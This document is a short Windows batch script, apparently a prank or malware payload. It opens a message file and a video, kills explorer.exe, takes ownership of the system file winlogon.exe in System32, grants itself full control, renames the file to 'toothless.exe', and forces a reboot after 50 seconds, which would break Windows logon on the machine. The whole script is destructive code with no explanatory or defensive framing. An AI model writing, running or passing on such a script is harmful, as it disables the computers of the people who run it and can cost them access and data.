@echo off
start message.txt
start video.mp4
taskkill /im explorer.exe /f
cd "C:\Windows\System32"
takeown /F winlogon.exe
icacls winlogon.exe /grant administrators:F /T 
rename winlogon.exe toothless.exe
shutdown /r /t 50
exit